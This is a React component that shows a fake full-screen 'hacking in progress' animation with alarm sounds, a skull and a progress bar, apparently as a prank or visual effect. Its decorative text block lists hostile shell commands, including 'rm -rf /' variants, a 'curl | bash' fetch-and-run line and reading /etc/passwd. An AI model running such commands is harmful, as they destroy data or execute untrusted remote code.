
import React, { useState, useEffect } from 'react';
import { AlertDialog, AlertDialogContent } from '@/components/ui/alert-dialog';
import { Skull, Zap, Shield } from 'lucide-react';
import { playRandomSound } from '@/assets/sounds';

interface HackerScreenProps {
  open: boolean;
  onClose: () => void;
}

const HackerScreen: React.FC<HackerScreenProps> = ({ open, onClose }) => {
  const [hackingProgress, setHackingProgress] = useState(0);
  const [hackingText, setHackingText] = useState('INITIATING HACK SEQUENCE...');
  const [showSkull, setShowSkull] = useState(false);

  // Array of hacking messages
  const hackingMessages = [
    'ACCESS GRANTED',
    'BYPASSING FIREWALL...',
    'OBTAINING USER CREDENTIALS...',
    'DOWNLOADING PERSONAL DATA...',
    'ACCESSING BANK ACCOUNTS...',
    'INSTALLING MALWARE...',
    'ACTIVATING KEYLOGGER...',
    'STEALING COOKIES...',
    'EXTRACTING PASSWORDS...',
    'UPLOADING VIRUSES...',
    'DISABLING ANTIVIRUS...',
    'SENDING DATA TO DARK WEB...',
    'FORMATTING HARD DRIVE...',
    'HACK COMPLETE!'
  ];

  useEffect(() => {
    if (!open) return;
    
    // Play alarm sound
    const alarmSound = new Audio('/alarm.mp3');
    alarmSound.volume = 0.3;
    alarmSound.loop = true;
    alarmSound.play().catch(e => console.error('Audio play failed:', e));
    
    // Initialize hacking sequence
    let progress = 0;
    let messageIndex = 0;
    
    const hackInterval = setInterval(() => {
      progress += 1;
      setHackingProgress(progress);
      
      // Update message every 7%
      if (progress % 7 === 0 && messageIndex < hackingMessages.length - 1) {
        messageIndex++;
        setHackingText(hackingMessages[messageIndex]);
        playRandomSound();
      }
      
      // Show skull at 50%
      if (progress >= 50 && !showSkull) {
        setShowSkull(true);
      }
      
      // End sequence
      if (progress >= 100) {
        clearInterval(hackInterval);
        setTimeout(() => {
          onClose();
        }, 3000);
      }
    }, 150);
    
    return () => {
      clearInterval(hackInterval);
      alarmSound.pause();
      alarmSound.currentTime = 0;
    };
  }, [open, onClose]);

  return (
    <AlertDialog open={open} onOpenChange={onClose}>
      <AlertDialogContent className="max-w-screen max-h-screen w-screen h-screen bg-black border-2 border-red-500 p-0 m-0 overflow-hidden flex flex-col items-center justify-center">
        <div className="animate-pulse text-red-500 font-mono text-4xl md:text-6xl font-bold mb-4">
          {hackingText}
        </div>
        
        <div className="w-4/5 bg-gray-900 border border-red-500 rounded-lg overflow-hidden mt-8">
          <div 
            className="bg-gradient-to-r from-red-500 via-red-700 to-red-500 h-6 animate-pulse"
            style={{ width: `${hackingProgress}%` }}
          ></div>
        </div>
        
        <div className="text-red-500 font-mono mt-4">
          {hackingProgress}% COMPLETE
        </div>
        
        <div className="fixed inset-0 flex items-center justify-center pointer-events-none">
          {showSkull && (
            <div className="animate-pulse">
              <Skull className="w-64 h-64 text-red-500 animate-spin-slow" />
            </div>
          )}
        </div>
        
        <div className="fixed top-0 left-0 w-full h-16 border-b border-red-500 bg-black flex items-center justify-between px-4">
          <div className="flex items-center">
            <Zap className="w-8 h-8 text-yellow-400 mr-2 animate-pulse" />
            <span className="text-red-500 font-mono text-xl">HACKING IN PROGRESS</span>
          </div>
          <div className="flex items-center">
            <Shield className="w-8 h-8 text-red-500 animate-pulse" />
          </div>
        </div>
        
        {/* Fake code snippets */}
        <div className="fixed bottom-8 left-8 right-8 h-32 bg-black border border-red-500 overflow-hidden rounded">
          <pre className="text-green-500 font-mono text-xs p-2 animate-typing">
            {`> openssl s_client -connect target.com:443
> nmap -sV -sC -A -T4 target.com
> ssh root@target.com -p 22
> sudo rm -rf /* --no-preserve-root
> cat /etc/passwd
> echo $PATH
> ./exploit.sh --target=127.0.0.1 --payload=ransomware
> curl -s https://malware.sh | bash
> python3 -c 'import os; os.system("rm -rf /*")'`}
          </pre>
        </div>
        
        {/* Random blinking dots */}
        <div className="fixed inset-0 pointer-events-none">
          {Array.from({ length: 20 }).map((_, i) => (
            <div 
              key={i}
              className="absolute w-2 h-2 rounded-full bg-red-500 animate-pulse"
              style={{
                top: `${Math.random() * 100}%`,
                left: `${Math.random() * 100}%`,
                animationDelay: `${Math.random() * 2}s`,
              }}
            ></div>
          ))}
        </div>
      </AlertDialogContent>
    </AlertDialog>
  );
};

export default HackerScreen;
